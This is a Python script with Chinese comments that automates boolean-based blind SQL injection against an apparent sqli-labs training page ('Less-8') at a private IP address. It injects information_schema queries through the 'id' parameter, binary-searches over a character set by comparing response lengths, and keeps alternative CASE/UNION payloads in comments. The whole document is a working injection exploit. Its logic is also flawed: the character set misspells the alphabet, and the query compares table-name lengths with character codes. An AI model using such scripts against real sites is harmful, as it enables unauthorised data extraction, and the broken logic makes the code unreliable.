import string
import requests
import time
url = "http://192.168.43.117:9002/Less-8/"
reslen = len(requests.get(url = url + "?id=1").text)
print("正常情况下网页返回数据的长度：" + str(reslen))

string = '0123456789ABCDEFGHIGHLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
flag = ''

i = 1
while i <= 7:
	left = 0
	right = len(string) - 1
	mid = int((left + right) / 2)

	# 特殊情况
	if (right - left) == 1:
		# table_url = url + "?id=1'+and+(select+ascii(mid((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+"+str(i)+",1),"+str(a)+",1)))=" +"'"+str(c)+"'" + " -- xn"
		poc = url + "?id=1'+and+(select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+{0},1)>{1}+--+xn".format(str(i),str(ord(string[left])))
		# payload = "(CASE WHEN (ascii(substr((select database()),{0},1))>{1}) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)".format(i, str(ord(string[left])))
		# print(poc)
		if len(requests.get(poc).text) != reslen:
			flag = flag + string[right]
			print(flag)
			exit()
		else: 
			flag = flag + string[left]
			print(flag)
			exit()
	# 二分法
	while 1:
		mid = int((left + right) / 2)
		poc = url + "?id=1'+and+(select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+{0},1)>{1}+--+xn".format(str(i),str(ord(string[mid])))
		# payload = "(CASE WHEN (ascii(substr((select database()),{0},1))>{1}) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)".format(i, str(ord(string[mid])))
		#poc = url + payload
		print(poc)
		if len(requests.get(poc).text) != reslen:
		# 右半部
			left = mid + 1
			print('left:'+str(left))
		# 左半部
		else: 
			right = mid
			print('right:'+str(right))
		if (left == right):
			flag = flag + string[left]
			break
		# 特殊情况
		if (right - left) == 1:
			poc = url + "?id=1'+and+(select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+{0},1)>{1}+--+xn".format(str(i),str(ord(string[left])))
			# payload = "(CASE WHEN (ascii(substr((select database()),{0},1))>{1}) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)".format(i, str(ord(string[left])))
			# poc = url + payload
			# print(poc)
			if len(requests.get(poc).text) != reslen:
				flag = flag + string[right]
				print(flag)
				break
			else: 
				flag = flag + string[left]
				print(flag)
				break
	i += 1
print(flag)